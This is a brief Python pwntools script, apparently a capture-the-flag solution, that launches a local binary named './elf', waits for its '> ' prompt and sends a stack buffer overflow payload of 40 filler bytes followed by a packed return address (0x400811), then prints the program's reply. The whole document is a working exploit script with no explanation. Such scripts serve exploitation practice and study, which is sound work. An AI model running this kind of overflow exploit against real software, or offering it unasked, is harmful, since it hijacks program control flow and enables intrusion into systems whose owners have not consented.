from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
io=process(p)

payload="a"*40+p64(0x0000000000400811)
io.recvuntil("> ")
io.sendline(payload)

print(io.recvline())
